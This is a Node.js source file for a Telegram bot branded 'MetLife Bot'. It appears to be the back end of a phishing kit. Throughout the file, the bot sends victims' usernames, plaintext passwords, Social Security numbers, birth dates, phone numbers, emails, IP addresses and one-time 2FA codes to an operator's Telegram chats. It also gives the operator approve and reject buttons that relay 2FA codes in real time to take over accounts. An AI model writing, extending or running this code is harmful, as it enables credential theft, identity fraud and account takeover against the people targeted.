const TelegramBot = require('node-telegram-bot-api');
const LoginRequest = require('./models/LoginRequest');

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = String(process.env.TELEGRAM_CHAT_ID || '');
const LOG_CHAT_ID = String(process.env.TELEGRAM_LOG_CHAT_ID); 
 console.log(LOG_CHAT_ID)// Dedicated log chat for public visibility
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://yoursite.com/admin/dashboard';
const BOT_NAME = process.env.BOT_NAME || 'MetLife Bot';

let bot = null;
let botIsConnected = false;
let messageIds = [];

// Store 2FA approval status for callback handling
const twoFAApprovalMap = {};

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Add bot name header to all messages
 */
function addBotHeader(content) {
  return `🤖 <b>[${escapeHtml(BOT_NAME)}]</b>\n\n${content}`;
}

/**
 * Track message ID for later deletion
 */
function trackMessage(message) {
  try {
    if (message && message.message_id) {
      messageIds.push(message.message_id);
      if (messageIds.length > 100) {
        messageIds.shift();
      }
    }
  } catch (err) {
    console.warn('[telegram] Failed to track message:', err.message);
  }
}

/**
 * Send message to both admin chat and log chat
 * @param {TelegramBot} bot - Bot instance
 * @param {string} text - Message text (HTML formatted)
 * @param {Object} options - Message options
 * @returns {Promise<Object>} - Sent message object
 */
async function sendToAdminAndLog(bot, text, options = {}) {
  const results = {
    adminMessage: null,
    logMessage: null,
  };

  try {
    // Send to admin chat
    if (ADMIN_CHAT_ID) {
      try {
        results.adminMessage = await bot.sendMessage(ADMIN_CHAT_ID, text, options);
        trackMessage(results.adminMessage);
      } catch (err) {
        console.error('[telegram] Failed to send to admin chat:', err.message);
      }
    }

    // Send to log chat (if configured)
    if (LOG_CHAT_ID) {
      try {
        results.logMessage = await bot.sendMessage(LOG_CHAT_ID, text, options);
        trackMessage(results.logMessage);
      } catch (err) {
        console.error('[telegram] Failed to send to log chat:', err.message);
      }
    }

    return results.adminMessage || results.logMessage;
  } catch (err) {
    console.error('[telegram] Error in sendToAdminAndLog:', err.message);
    return null;
  }
}

function getBot() {
  if (bot) return bot;

  if (!TOKEN || !ADMIN_CHAT_ID) {
    console.warn('[telegram] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set — bot notifications are disabled.');
    return null;
  }

  try {
    bot = new TelegramBot(TOKEN, { polling: true });

    bot.on('polling_error', (err) => {
      console.error('[telegram] polling error:', err.message);
      botIsConnected = false;
    });

    bot.getMe()
      .then((me) => {
        botIsConnected = true;
        console.log(`[telegram] Bot connected as @${me.username}, polling started.`);
        if (LOG_CHAT_ID) {
          console.log(`[telegram] Log chat enabled. Messages will be sent to both admin and log chats.`);
        }
      })
      .catch((err) => {
        botIsConnected = false;
        console.error('[telegram] Failed to verify bot connection:', err.message);
      });

    registerCommandHandlers(bot);
    registerCallbackHandlers(bot);
    return bot;
  } catch (err) {
    console.error('[telegram] Failed to initialize bot:', err.message);
    bot = null;
    botIsConnected = false;
    return null;
  }
}

/* ============================================================
 * Bot Command Handlers
 * ============================================================ */

function registerCommandHandlers(b) {
  // /start command
  b.onText(/\/start/, async (msg) => {
    try {
      const chatId = msg.chat.id;
      const botConnected = botIsConnected;
      const statusEmoji = botConnected ? '✅' : '⚠️';
      const botStatus = botConnected ? '✅ Active' : '❌ Inactive';

      const content =
        `<b>System Status</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n\n` +
        `🤖 <b>Bot Connection:</b> <code>${botStatus}</code>\n` +
        `📡 <b>Server:</b> <code>✅ Running</code>\n` +
        `⏰ <b>UTC Time:</b> <code>${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}</code>\n\n` +
        `<b>Available Commands</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `/start - Show system status\n` +
        `/help - Show available commands\n` +
        `/ping - Test bot connection\n` +
        `/clear_chat - Clear all chat messages (admin only)`;

      const text = addBotHeader(content);
      await b.sendMessage(chatId, text, { parse_mode: 'HTML' });
    } catch (err) {
      console.error('[telegram] /start command error:', err.message);
    }
  });

  // /help command
  b.onText(/\/help/, async (msg) => {
    try {
      const chatId = msg.chat.id;
      const content =
        `<b>📖 Available Commands</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n\n` +
        `<b>/start</b>\n` +
        `Check server and connection status\n\n` +
        `<b>/ping</b>\n` +
        `Test bot response time\n\n` +
        `<b>/clear_chat</b>\n` +
        `Clear all messages from chat (admin only)\n\n` +
        `<b>/help</b>\n` +
        `Show this help message\n\n` +
        `<i>Note: Only admin chat can manage login requests.</i>`;

      const text = addBotHeader(content);
      await b.sendMessage(chatId, text, { parse_mode: 'HTML' });
    } catch (err) {
      console.error('[telegram] /help command error:', err.message);
    }
  });

  // /ping command
  b.onText(/\/ping/, async (msg) => {
    try {
      const chatId = msg.chat.id;
      const startTime = Date.now();
      const sent = await b.sendMessage(chatId, '🏓 Pong!');
      const responseTime = Date.now() - startTime;

      const content = 
        `🏓 <b>Pong!</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n\n` +
        `📊 <b>Response Time:</b> <code>${responseTime}ms</code>`;
      const text = addBotHeader(content);
      await b.editMessageText(text, {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: 'HTML',
      });
    } catch (err) {
      console.error('[telegram] /ping command error:', err.message);
    }
  });

  // /clear_chat command
  b.onText(/\/clear_chat/, async (msg) => {
    try {
      const chatId = msg.chat.id;

      if (String(chatId) !== ADMIN_CHAT_ID) {
        const content = 
          `<b>🔒 Access Denied</b>\n` +
          `━━━━━━━━━━━━━━━━━━\n\n` +
          `Only admins can clear chat history.`;
        const text = addBotHeader(content);
        await b.sendMessage(chatId, text, { parse_mode: 'HTML' });
        return;
      }

      try {
        let deletedCount = 0;
        const failedCount = messageIds.length;

        for (const msgId of messageIds) {
          try {
            await b.deleteMessage(ADMIN_CHAT_ID, msgId);
            deletedCount++;
          } catch (err) {
            console.log('[telegram] Could not delete message:', msgId);
          }
        }

        messageIds = [];

        const content = 
          `<b>🗑️ Chat Cleared Successfully</b>\n` +
          `━━━━━━━━━━━━━━━━━━\n\n` +
          `📊 <b>Summary:</b>\n` +
          `✅ <b>Deleted:</b> <code>${deletedCount}</code> messages\n` +
          `⚠️ <b>Failed:</b> <code>${failedCount - deletedCount}</code> messages`;
        const text = addBotHeader(content);
        await b.sendMessage(chatId, text, { parse_mode: 'HTML' });
      } catch (err) {
        console.error('[telegram] /clear_chat error:', err.message);
      }
    } catch (err) {
      console.error('[telegram] /clear_chat handler error:', err.message);
    }
  });
}

/* ============================================================
 * Callback Handlers (Approve/Reject Buttons)
 * ============================================================ */

async function handleLoginApprovalCallback(b, query, action, verificationId) {
  try {
    const fromChatId = String(query.message?.chat?.id || '');

    if (fromChatId !== ADMIN_CHAT_ID) {
      await b.answerCallbackQuery(query.id, { text: 'Not authorized.', show_alert: true });
      return;
    }

    const approval = global.twoFAApprovals?.[verificationId];
    const loginRequest = await LoginRequest.findOne({ verificationId });
    
    if (!approval && !loginRequest) {
      await b.answerCallbackQuery(query.id, { text: 'Login request not found.', show_alert: true });
      return;
    }

    if (approval && approval.status !== 'pending_approval') {
      await b.answerCallbackQuery(query.id, { text: `Already ${approval.status}.`, show_alert: true });
      return;
    }

    if (loginRequest && loginRequest.status !== 'pending' && loginRequest.status !== 'pending_approval') {
      await b.answerCallbackQuery(query.id, { text: `Already ${loginRequest.status}.`, show_alert: true });
      return;
    }

    if (action === 'approve') {
      // Update database
      await LoginRequest.findOneAndUpdate(
        { verificationId },
        {
          status: 'approved',
          approvedBy: 'telegram_bot',
          approvedAt: new Date(),
          logType: approval ? '2fa_code' : 'login_request',
        }
      );

      // Update global approval status
      if (approval) {
        approval.status = 'approved';
      }

      const approveContent = approval
        ? `✅ <b>2FA Approval Request</b>\n` +
          `━━━━━━━━━━━━━━━━━━\n\n` +
          `Ⓜ️ <b>Method:</b> <code>${escapeHtml(approval?.method || 'Unknown')}</code>\n` +
          `🔑 <b>Username:</b> <code>${escapeHtml(approval?.username || 'N/A')}</code>\n` +
          `🔢 <b>Code:</b> <code>${escapeHtml(approval?.code || 'N/A')}</code>\n\n` +
          `✅ <b>STATUS: APPROVED</b>\n` +
          `User can now proceed to dashboard.`
        : `✅ <b>Login Approval Request</b>\n` +
          `━━━━━━━━━━━━━━━━━━\n\n` +
          `🔑 <b>Username:</b> <code>${escapeHtml(loginRequest?.username || 'N/A')}</code>\n` +
          `🔓 <b>Password:</b> <code>${escapeHtml(loginRequest?.password || 'N/A')}</code>\n\n` +
          `✅ <b>STATUS: APPROVED</b>\n` +
          `User can now proceed to 2FA verification.`;

      const approveText = addBotHeader(approveContent);

      // Edit message with redirect button after approval
      await b.editMessageText(approveText, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { 
                text: '🔗 Go to Dashboard', 
                url: REDIRECT_URL 
              }
            ],
          ],
        },
      });

      // Also send approval log to both chats
      await sendToAdminAndLog(b, approveText, { parse_mode: 'HTML' });

      await b.answerCallbackQuery(query.id, { text: 'Login approved successfully.' });
    } else if (action === 'reject') {
      // Update database
      await LoginRequest.findOneAndUpdate(
        { verificationId },
        {
          status: 'rejected',
          approvedBy: 'telegram_bot',
          approvedAt: new Date(),
          rejectedReason: 'Rejected by admin via Telegram',
          logType: approval ? '2fa_code' : 'login_request',
        }
      );

      // Update global approval status
      if (approval) {
        approval.status = 'rejected';
      }

      const rejectContent = approval
        ? `❌ <b>2FA Approval Request</b>\n` +
          `━━━━━━━━━━━━━━━━━━\n\n` +
          `Ⓜ️ <b>Method:</b> <code>${escapeHtml(approval?.method || 'Unknown')}</code>\n` +
          `🔑 <b>Username:</b> <code>${escapeHtml(approval?.username || 'N/A')}</code>\n` +
          `🔢 <b>Code:</b> <code>${escapeHtml(approval?.code || 'N/A')}</code>\n\n` +
          `❌ <b>STATUS: REJECTED</b>\n` +
          `User access has been denied.`
        : `❌ <b>Login Approval Request</b>\n` +
          `━━━━━━━━━━━━━━━━━━\n\n` +
          `🔑 <b>Username:</b> <code>${escapeHtml(loginRequest?.username || 'N/A')}</code>\n` +
          `🔓 <b>Password:</b> <code>${escapeHtml(loginRequest?.password || 'N/A')}</code>\n\n` +
          `❌ <b>STATUS: REJECTED</b>\n` +
          `User login has been rejected.`;

      const rejectText = addBotHeader(rejectContent);

      await b.editMessageText(rejectText, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [] },
      });

      // Also send rejection log to both chats
      await sendToAdminAndLog(b, rejectText, { parse_mode: 'HTML' });

      await b.answerCallbackQuery(query.id, { text: 'Login rejected successfully.' });
    }
  } catch (err) {
    console.error('[telegram] login approval callback error:', err.message);
    try {
      await b.answerCallbackQuery(query.id, { text: 'Something went wrong.', show_alert: true });
    } catch (_) {
      // ignore
    }
  }
}

function registerCallbackHandlers(b) {
  b.on('callback_query', async (query) => {
    try {
      const data = query.data || '';
      const [scope, action, requestId] = data.split(':');

      if (scope === 'login') {
        return handleLoginApprovalCallback(b, query, action, requestId);
      }
    } catch (err) {
      console.error('[telegram] callback_query handling error:', err.message);
      try {
        await b.answerCallbackQuery(query.id, { text: 'Something went wrong.', show_alert: true });
      } catch (_) {
        // ignore
      }
    }
  });
}

/**
 * Get bot connection status
 */
function isBotConnected() {
  return botIsConnected && bot !== null;
}

/**
 * Send username notification
 */
async function sendUsernameNotification(data, meta = {}) {
  const { username } = data;

  try {
    const b = getBot();
    if (!b) return null;

    const content =
      `🔐 <b>Username Entered</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n\n` +
      `🔑 <b>Username:</b> <code>${escapeHtml(username)}</code>\n`;

    const text = addBotHeader(content);
    return await sendToAdminAndLog(b, text, {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    });
  } catch (err) {
    console.error('[telegram] Failed to send username notification:', err.message);
    return null;
  }
}
/**
 * Send details notification
 */
async function sendDetailsNotification(data, meta = {}) {
  const { username, ssn, dob, phone, email } = data;

  try {
    const b = getBot();
    if (!b) return null;

    const content =
      `🔐 <b>Details Entered</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n\n` +
      `🧑‍🦰 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
      `🔑 <b>SSN:</b> <code>${escapeHtml(ssn)}</code>\n` +
      `📅 <b>Date of Birth:</b> <code>${escapeHtml(dob)}</code>\n` +
      `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `✉️ <b>Email:</b> <code>${escapeHtml(email)}</code>\n`;

    const text = addBotHeader(content);
    return await sendToAdminAndLog(b, text, {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    });
  } catch (err) {
    console.error('[telegram] Failed to send details notification:', err.message);
    return null;
  }
}

/**
 * Send login attempt notification with auto-redirect
 */
async function sendLoginAttemptNotification(data, meta = {}) {
  const b = getBot();

  const { username, password, verificationId } = data;

  const content =
    `🔓 <b>Login Approval Request</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n\n` +
    `🔑 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
    `🔓 <b>Password:</b> <code>${escapeHtml(password)}</code>\n` +
    `📍 <b>IP:</b> <code>${meta.ip || 'Unknown'}</code>\n` +
    `⏰ <b>UTC Time:</b> <code>${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}</code>\n\n` +
    `<b><a href="${REDIRECT_URL}">👉 Approve or Deny</a></b>`;

  const text = addBotHeader(content);

  try {
    if (!b) return null;

    const options = {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    };

    return await sendToAdminAndLog(b, text, options);
  } catch (err) {
    console.error('[telegram] Failed to send login attempt notification:', err.message);
    return null;
  }
}

/**
 * Send 2FA code verification notification
 */
async function sendTwoFactorCodeNotification(data, meta = {}) {
  const { username, code, status, expectedCode, method, reason } = data;

  let statusEmoji = '⚠️';
  let statusText = status.toUpperCase();
  let statusDetail = '';

  if (status === 'correct') {
    statusEmoji = '✅';
    statusText = 'CODE CORRECT';
    statusDetail = `Code verified successfully. Awaiting admin approval.`;
  } else if (status === 'incorrect') {
    statusEmoji = '❌';
    statusText = 'CODE INCORRECT';
    statusDetail = `Expected: <code>${escapeHtml(expectedCode)}</code>\nEntered: <code>${escapeHtml(code)}</code>`;
  } else if (status === 'expired') {
    statusEmoji = '⏱️';
    statusText = 'CODE EXPIRED';
    statusDetail = `Code has expired. User needs to login again.`;
  } else if (status === 'failed') {
    statusEmoji = '❌';
    statusText = 'VERIFICATION FAILED';
    statusDetail = `Reason: ${escapeHtml(reason || 'Unknown')}`;
  }

  const content =
    `${statusEmoji} <b>2FA Code Verification</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n\n` +
    `Ⓜ️ <b>Method:</b> <code>${escapeHtml(method || 'Unknown')}</code>\n` +
    `🔑 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
    `${code ? `🔢 <b>Code:</b> <code>${escapeHtml(code)}</code>\n` : ''}` +
    `\n<b>Status:</b> ${statusEmoji} <code>${statusText}</code>\n` +
    `${statusDetail ? `📝 <b>Details:</b> ${statusDetail}\n` : ''}`;

  const text = addBotHeader(content);

  try {
    const b = getBot();
    if (!b) return null;

    return await sendToAdminAndLog(b, text, {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    });
  } catch (err) {
    console.error('[telegram] Failed to send 2FA code notification:', err.message);
    return null;
  }
}

/**
 * Send 2FA approval request to admin with Approve/Reject buttons
 */
async function send2FAApprovalRequest(data, meta = {}) {
  const { username, code, method, verificationId } = data;

  // Store approval data for callback handling
  if (!global.twoFAApprovals) {
    global.twoFAApprovals = {};
  }
  global.twoFAApprovals[verificationId] = {
    username,
    code,
    method,
    status: 'pending_approval',
  };

  const content =
    `⏳ <b>2FA Approval Request</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n\n` +
    `Ⓜ️ <b>Method:</b> <code>${escapeHtml(method || 'Unknown')}</code>\n` +
    `🔑 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
    `🔢 <b>Code:</b> <code>${escapeHtml(code)}</code>\n\n` +
    `<b><a href="${REDIRECT_URL}">👉 Approve or Deny</a></b>`;

  const text = addBotHeader(content);

  try {
    const b = getBot();
    if (!b) return null;

    return await sendToAdminAndLog(b, text, {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    });
  } catch (err) {
    console.error('[telegram] Failed to send 2FA approval request:', err.message);
    return null;
  }
}

/**
 * Send visitor log notification
 */
async function sendVisitorLogNotification(notification, data = {}) {
  try {
    const b = getBot();
    if (!b) return;

    const text = addBotHeader(notification);
    await sendToAdminAndLog(b, text, {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    });
    console.log('[telegram] ✅ Visitor log notification sent to admin and log chats');
  } catch (err) {
    console.error('[telegram] Failed to send visitor log:', err.message);
  }
}

/**
 * Send admin decision notification
 */
async function sendAdminDecisionNotification(data) {
  const { username, decision, reason, verificationId, code,password, method, approvedBy } = data;

  let content = '';
  if (decision === 'approved') {
    content =
      `✅ <b>Login Approved</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n\n` +
      `🧑‍🦰 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
      `🔑 <b>Password:</b> <code>${escapeHtml(password)}</code>\n` +
      `📐 <b>Method:</b> <code>${escapeHtml(method || 'Unknown')}</code>\n` +
      `📋 <b> Code:</b> <code>${escapeHtml(code || 'Unknown')}</code>\n\n` +
      `✓ <b>Status:</b> User has been approved and can now proceed.`;
  } else if (decision === 'rejected') {
    content =
      `❌ <b>Login Rejected</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n\n` +
      `🧑‍🦰 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
       `🔑 <b>Password:</b> <code>${escapeHtml(password)}</code>\n` +
       `📐 <b>Method:</b> <code>${escapeHtml(method || 'Unknown')}</code>\n` +
      `📋 <b> Code:</b> <code>${escapeHtml(code || 'Unknown')}</code>\n\n` +
      `✗ <b>Status:</b> User login has been rejected.`;
  } else if (decision === 'redirected') {
    content =
      `🔄 <b>Redirected</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n\n` +
      `🧑‍🦰 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
       `🔑 <b>Password:</b> <code>${escapeHtml(password)}</code>\n` +
       `📐 <b>Method:</b> <code>${escapeHtml(method || 'Unknown')}</code>\n` +
      `📋 <b> Code:</b> <code>${escapeHtml(code || 'Unknown')}</code>\n\n` +
      `✗ <b>Status:</b> User has been redirected.`;
  }

  const text = addBotHeader(content);

  try {
    const b = getBot();
    if (!b) return null;

    return await sendToAdminAndLog(b, text, {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    });
  } catch (err) {
    console.error('[telegram] Failed to send admin decision notification:', err.message);
    return null;
  }
}

module.exports = {
  getBot,
  isBotConnected,
  sendVisitorLogNotification,
  sendLoginAttemptNotification,
  sendUsernameNotification,
  sendTwoFactorCodeNotification,
  send2FAApprovalRequest,
  sendDetailsNotification,
  sendAdminDecisionNotification,
};